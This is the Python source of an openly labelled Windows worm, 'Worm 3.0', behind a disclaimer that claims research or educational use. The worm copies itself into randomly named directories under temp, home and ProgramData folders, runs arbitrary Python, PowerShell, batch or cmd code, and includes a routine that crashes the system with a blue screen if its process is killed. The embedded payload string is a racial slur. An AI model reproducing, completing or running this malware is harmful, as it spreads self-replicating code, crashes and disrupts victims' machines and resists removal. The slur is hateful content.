#DISCLAIMER#
#Any missuse or abuse of this tool is not any concern or fault of the developer as this tool was made for research\pentesting\educational purposes ONLY!
#'''The file needs to be an exe to work'''#
#DISCLAIMER#



import os
import time
import random
import shutil
import sys
import subprocess
import psutil
import ctypes

TEST_MODE = True #test mode is when ur testing the worm and dont want any spreadness happening exc
File_Execution = False # if true all the replicated files will be ran on standby
BASE_DIRS = 10 #Directories made that the worm will spread to times the spread_power
SPREAD_POWER = 1 #Spread power is how much dirrectories are gonna be made times the BASE_DIRS variable and how hard it is to delete the worm numbers less then 0 are considered as 1 more then 3 are also considered as 1
EXECUTE = True # if true will execute the code that is given in the CODE variable
CODE = """print("FUCK NIGGERS")"""
CODE_TYPE = "PYTHON" #Code type that will be executed if the EXECUTE variable is true There are 4 types 1: Python 2:Batch 3:Cmd 4: PowerShell it needs to be exacly rewriten or it wont work
SELF_PATH = sys.argv[0]
name = str(sys.argv[0])
Paths = (os.getenv("temp"), os.path.expanduser("~"), os.getenv("ProgramData"))
TARGET_PROCESS_NAME = name

def trigger_bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

DIRS = []
FILE_PATHS = []
if TEST_MODE == True:
    if SELF_PATH.endswith(".py"):
        v = input("The file is in python meaning the src is vissible u sure u want to continue? Y/N: ")
        if v.capitalize == "Y":
            pass
        elif v.capitalize == "N":
            os._exit(1)
def main():
    print("Worm 3.0 imjustazuu0")
    print(SELF_PATH)
    time.sleep(3)
    for i in range(BASE_DIRS * SPREAD_POWER):
         dire = (os.path.join(random.choice(Paths),''.join(random.choices("abcdefghijklguhaijshihguidshgjbuih0wjeiuyf84gjhdfhshijfsdgihsdfgiuh", k=25) )))
         dire = dire + "WORM"
         DIRS.append(dire)
         subprocess.run(["mkdir", dire],shell=True)
         print(f"Directory {dire} was made")
    print(DIRS)
    for directory in DIRS:
        print(f"Spreading to: {directory}")
        shutil.copy(SELF_PATH,directory)
    if EXECUTE:
        if CODE_TYPE.capitalize() == "PYTHON":
            exec(CODE)
        elif CODE_TYPE.capitalize() == "POWERSHELL":
            subprocess.call([CODE], shell=True)
        elif CODE_TYPE.capitalize() == "BATCH" or CODE_TYPE.capitalize() == "BAT":
            with open("code.bat", "w") as f:
                f.write(CODE)
            subprocess.call(["start code.bat"])
            time.sleep(1)
            try:
                subprocess.call([f"del code.bat"])
            except PermissionError:
                f.truncate(0)
        elif CODE_TYPE.capitalize() == "COMMAND LINE" or CODE_TYPE.capitalize() == "CMD":
            subprocess.run([CODE])
        else:
            pass

    if File_Execution:
        for file in FILE_PATHS:
            subprocess.call([file])  
        else:
            pass
    if TEST_MODE == True:
        x = input("do you wanna delete all the dirs that were made Y/N: ")
        if x.capitalize() == "Y":
            for directory in DIRS:
                print("removing..." + directory)
                time.sleep(0.1)
                shutil.rmtree(directory)
            print("all directories removed :)")
        else:
            pass    
def monitor_task():
    """ Continuously monitors for the target process and triggers BSOD if it is killed. """
    process_exists = True
    
    while process_exists:
        # Check if the process is running
        process_exists = any(proc.name() == TARGET_PROCESS_NAME for proc in psutil.process_iter())
        
        if not process_exists:
            print(f"Process '{TARGET_PROCESS_NAME}' has been killed or not found!")
            # Trigger BSOD here
            trigger_bsod()
            break

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "EXECUTE":
        pass 
    else:
        main()
